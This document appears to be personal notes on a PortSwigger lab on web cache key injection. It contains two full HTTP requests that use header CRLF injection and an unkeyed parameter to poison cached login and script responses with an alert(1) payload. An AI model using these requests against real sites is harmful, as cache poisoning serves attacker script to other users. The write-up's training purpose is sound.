# EXPERT: Cache key injection

https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Poisoning/cache-12/

`utm_content` is a secret URL param that gets reflected in a cookie. It’s also excluded from the cache key.

![Снимок экрана 2025-12-02 в 16.23.30.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.23.30.png)

There’s also a script import in a login page.

![Снимок экрана 2025-12-02 в 16.26.05.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.26.05.png)

Where we can Inject arbitrary CORS param with `cors=1` and Origin header:

![Снимок экрана 2025-12-02 в 16.28.18.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.28.18.png)

We can also use `Pragma: x-get-cache-key` to see cache key

![Снимок экрана 2025-12-02 в 16.29.38.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.29.38.png)

Using below requests, we can poison cache for login page and localize.js page:

```python
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
Host: 0aa300e1046b136280d9036300e300f6.web-security-academy.net
Cookie: session=nx12nIV7LrXqc33xnPbJzEEimMvG774Z; lang=en; session=stYJsAsAHGsBY8xlc6i6OiVP9GXHGTis
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa300e1046b136280d9036300e300f6.web-security-academy.net/login/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

![Снимок экрана 2025-12-02 в 16.47.51.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.47.51.png)

```python
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
Host: 0aa300e1046b136280d9036300e300f6.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa300e1046b136280d9036300e300f6.web-security-academy.net/login/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

![Снимок экрана 2025-12-02 в 16.48.06.png](EXPERT%20Cache%20key%20injection/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-02_%D0%B2_16.48.06.png)